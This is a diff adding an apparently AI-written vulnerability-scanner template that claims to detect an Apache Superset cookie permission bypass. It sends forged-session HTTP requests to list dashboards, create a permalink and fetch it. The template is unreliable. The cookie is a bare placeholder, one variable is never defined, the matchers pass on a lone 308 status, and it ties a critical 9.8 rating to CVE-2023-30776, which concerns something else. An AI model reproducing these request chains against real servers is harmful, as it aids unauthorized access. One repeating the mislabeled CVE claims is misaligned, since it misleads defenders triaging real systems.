@@ -1,0 +1,67 @@
+id: apache-superset-cookie-bypass
+info:
+  name: Apache Superset Cookie Permission Bypass Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Apache Superset Cookie has a permission bypass vulnerability that allows an attacker to control the entire system, leaving the system in an extremely unsafe state.
+  reference:
+    - https://superset.apache.org
+  classification:
+    cve-id:
+      - CVE-2023-30776
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+http:
+  - raw:
+      - |
+        GET /api/v1/dashboard/ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: session=forged_cookie_value
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "dashboard" 
+
+  - raw:
+      - |
+        POST /api/v1/dashboard/{{dashboard_id}}/permalink HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Cookie: session=forged_cookie_value
+        Sec-Fetch-Dest: empty
+        Sec-Fetch-Mode: same-origin
+        Sec-Fetch-Site: same-origin
+
+        {"filterState":{},"urlParams":[]}
+    extractors:
+      - type: regex
+        name: permalink_key
+        part: body
+        regex:
+          - "\"key\":\"([a-zA-Z0-9]+)\""
+        internal: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 201
+  - raw:
+      - |
+        GET /superset/dashboard/p/{{permalink_key}}/ HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: session=forged_cookie_value
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 308
+      - type: word
+        part: body
+        words:
+          - "object of type 'int' has no len()"
